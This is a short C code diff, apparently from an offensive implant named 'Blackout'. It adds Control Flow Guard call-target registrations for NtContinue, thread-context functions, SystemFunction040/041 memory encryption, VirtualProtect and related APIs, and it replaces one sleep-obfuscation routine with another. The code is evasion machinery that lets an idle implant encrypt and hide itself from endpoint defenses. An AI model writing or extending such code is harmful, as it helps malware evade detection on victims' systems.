@@ -8,8 +8,20 @@ FUNC VOID BlackoutMain(
         
     BlackoutInit();
 
+    if ( CfgCheckEnabled() ) {
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
+        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
+    }
+
     while( 1 ) {
-        FoliageObf( 3 * 1000 );
+        SleepMain( 5 * 1000 );
     }
 
     return;
